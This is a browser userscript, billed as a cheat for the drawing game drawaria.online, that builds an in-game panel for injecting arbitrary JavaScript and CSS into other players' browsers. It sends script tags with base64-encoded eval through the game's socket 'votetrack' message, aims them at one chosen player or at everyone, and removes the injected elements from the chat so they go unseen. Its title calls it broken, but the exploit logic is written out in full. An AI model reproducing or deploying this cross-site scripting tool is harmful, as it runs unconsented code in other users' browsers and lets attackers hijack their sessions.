// ==UserScript==
// @name         Cheat - ScriptInjector - BROKEN
// @namespace    https://drawaria.online/profile/?uid=63196790-c7da-11ec-8266-c399f90709b7
// @version      1.0.0
// @description  Inject Scripts into the chat for everyone to see (and execute)
// @author       ≺ᴄᴜʙᴇ³≻
// @match        https://*.drawaria.online/
// @match        https://*.drawaria.online/test
// @match        https://*.drawaria.online/room/*
// @icon64       data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAPWSURBVHhe7ZjPaxNBFMff5oetWOvNKqJYmyCCQjXqH6AHRS8eBc81FASpbUHwIN4KjfUiaNSr9/bg0R70JoYKFjwkTQsiojfbSqslu37f5KUkadLdabJN4s4Hlpk3P7KZN+9XQgaDIdBY0tYlHo870u1IstnstmcMSRtYjAKkDSzaMcDNp1qN7vc1LiBtYDExQNq6uPmUbp3gdwwxMUATowBpA0vDMaDdMDFAE98tQDdLVNPo+4wFuGAUIG1g8T0G7DYmBmjScgtodpYwFqCJUYC0gaXlMaDZmBigScstQDcLuL3fWIAmRgHSBpaWx4BmY2KAJr5bQLOjvBvGAjRpGwU4jjNdKBT6RNwxfOP8RKPRrnA4fFKG69I2LsCHz+fzP0XcNXxXgC75x1TxvhOjtb/j4kPqtnto2ArRLew4jVVdMlXEoT8Ym3dseh1apWf9j2hdZiroyBiQTdFRZz99wOGnICa2HJ4pjiV4Da/lPcWJStrGBUqfW88CYrHYXC6XO4eb7+IDYfSMWuARx6H50ApdqLaETrKANB6HzV738IxlwU0OYG8VHaOASCQyy63y+Uqm99rUx5ZS/jjrdAi3PiNrFJCr93aOCyQSiWgmk9nIp2DCZT5v4/Cxcdpx9vBdAbq4ZYFmK6DzsgBSm/QUoRClv0/SQRG1adgCvJp4CTcLcrOAhUkakfS3Pf9rHcCHweE+i1gfj3WAbwoo1fZ84+WPTO8YvskC0XVPSiiBtBkmesPVo4xs4psCbNtO+lXbx8foq7VCF2He9yBmlLm7ASWoGqKKhmOAGwsp+osiJCoiLdvUMzhOv0Ws4NMk7esN0aqInLc3BsZoj4hacGBcQ4BE90ZxRJFBTDkvfYXvMQDaWpKuoteiy9LdQo25ir06HEZqRIGUFLEI/2iqwncFwHxUBVcC8sRCGkVpFWrMogkRS1Ts9QPfXWAxRWdtmB7cYHMfTPsLhPvLDr1lWW5+AitOscxgjYPbSfSP0ZwMKZAmP6JJFCW1bgYRIDnwgH7IkMKrC2grQAPOuzEo7BviwAsoYKg47A0c7CX8/zbefwRiDlllBL8Gny9O0Qjm3OuAGnDQHBinJyIq/HSBbnzpFHeiFt2F7b9Xo17AWrWHu8XP4PTF/mzRL3oGBVRUg55A2lQ1RBW+xgDLsm7id/zwsVFai1h0BXX7KzZtmd4Cz/HN81rew3v5M3gO7SCsYYjrALjUNT6Q2uQFrOXaoVY16KcLlLBxqjswX6V9iQlJvPgSPvg4j6G/hP4sbiNd8nk5/FN0yy9pDc9VuNW7Zv0lZjAYggzRPwdv42CLMor1AAAAAElFTkSuQmCC
// @grant        none
// @license      GNU GPLv3
// @run-at       document-idle
// ==/UserScript==

(function (scope) {
  const CodeMaid = scope['CodeMaid'];
  const Cheat = scope['___cheat'];

  class ScriptInjector extends Cheat {
    static dummy = Cheat.set('Engine', this);

    constructor() {
      super();
      this.elements.label.innerHTML = '<i class="fa-duotone fa-rectangle-terminal"></i>';
      this.init();
    }

    init() {
      this.playerlist_element = document.querySelector('#playerlist');
      this.playerlist = [];
      this.#row1();
      this.#row2();
      this.#row3();
      this.getPlayers();
    }

    #row1() {
      let self = this;
      let row = CodeMaid.createDOM.Row();
      {
        let getPlayers_button = CodeMaid.createDOM.Button('<i class="fa-duotone fa-arrow-rotate-right"></i>');
        getPlayers_button.classList.add('icon');

        getPlayers_button.addEventListener('click', function (event) {
          self.getPlayers();
        });
        row.append(getPlayers_button);
      }
      {
        let player_select = CodeMaid.createDOM.Tree('select', { style: 'width:100%;' });
        row.append(player_select);
        self.player_select = player_select;
      }
      this.elements.body.append(row);
    }

    #row2() {
      let self = this;
      let row = CodeMaid.createDOM.Row();
      let command_input = CodeMaid.createDOM.Tree('input', { type: 'text', placeholder: '</script>' });
      {
        let clearCommand_button = CodeMaid.createDOM.Button('<i class="fa-duotone fa-text-slash"></i>');
        clearCommand_button.classList.add('icon');

        clearCommand_button.addEventListener('click', function (event) {
          command_input.value = '';
        });
        row.append(clearCommand_button);
      }
      {
        command_input.addEventListener('keypress', function (event) {
          if (event.keyCode != 13) return;
          self.injectScript(command_input.value);
        });
        row.append(command_input);
      }
      {
        let sendCommand_button = CodeMaid.createDOM.Button('<i class="fa-duotone fa-paper-plane"></i>');
        sendCommand_button.classList.add('icon');

        sendCommand_button.addEventListener('click', function (event) {
          self.injectScript(command_input.value);
        });
        row.append(sendCommand_button);
      }
      this.elements.body.append(row);
    }

    #row3() {
      let self = this;
      let row = CodeMaid.createDOM.Row();
      let command_input = CodeMaid.createDOM.Tree('input', { type: 'text', placeholder: '</style>' });
      {
        let clearCommand_button = CodeMaid.createDOM.Button('<i class="fa-duotone fa-text-slash"></i>');
        clearCommand_button.classList.add('icon');

        clearCommand_button.addEventListener('click', function (event) {
          command_input.value = '';
        });
        row.append(clearCommand_button);
      }
      {
        command_input.addEventListener('keypress', function (event) {
          if (event.keyCode != 13) return;
          self.injectScript(
            `let style=document.createElement('style');document.head.append(style);style.textContent='${command_input.value}'`
          );
        });
        row.append(command_input);
      }
      {
        let sendCommand_button = CodeMaid.createDOM.Button('<i class="fa-duotone fa-paper-plane"></i>');
        sendCommand_button.classList.add('icon');

        sendCommand_button.addEventListener('click', function (event) {
          self.injectScript(
            `let style=document.createElement('style');document.head.append(style);style.textContent='${command_input.value}'`
          );
        });
        row.append(sendCommand_button);
      }
      this.elements.body.append(row);
    }

    getPlayers() {
      let self = this;
      {
        // find all Players
        self.playerlist = [{ id: -1, display: 'Everyone' }];
        Array.from(self.playerlist_element.children).forEach(function (node) {
          let data = {
            id: Number(node.dataset.playerid),
            display: String(node.querySelector('.playerlist-name a').textContent),
          };
          self.playerlist.push(data);
        });
      }
      {
        // apply found players
        self.player_select.innerHTML = '';
        self.playerlist.forEach(function (player) {
          self.player_select.append(CodeMaid.createDOM.Tree('option', { value: player.id }, [player.display]));
        });
      }
      return;
    }

    injectScript(command) {
      // command = command.replaceAll("'", "\\'");
      // command = command.replaceAll('"', '\\"');
      const result = scriptify(this.player_select.value, command);
      scope['sockets'][0]?.send(scope['socketIO'].emits['votetrack'](result));
    }
  }

  function scriptify(playerid, content) {
    let data = [
      `<script>try{setTimeout(()=>{const myID=Number(document.querySelector('.playerlist-name-self')?.parentElement.dataset.playerid);if(${playerid}<0||${playerid}==myID){eval(atob('${btoa(content)}'))}},2000);}catch(e){}</script>`,
      `<script>document.querySelectorAll('#chatbox_messages script').forEach(function(s){s.parentNode==document.getElementById('chatbox_messages')?s.remove():s.parentNode.remove();});</script>`,
    ];
    let message = data.join('');
    // debugInject(message);
    return message;
  }

  function debugInject(msg) {
    let t = document.createElement('div');
    t.className = 'chatmessage systemchatmessage';
    t.setAttribute('data-ts', Date.now());
    let n = document.createElement('span');
    n.className = 'playerchatmessage-selfname1';
    n.textContent = 'TEST';
    t.append(n);
    t.innerHTML += ` has just added a track to Music Playlist (track id: ${msg})`;
    document.getElementById('chatbox_messages').append(t);
  }
})(globalThis);
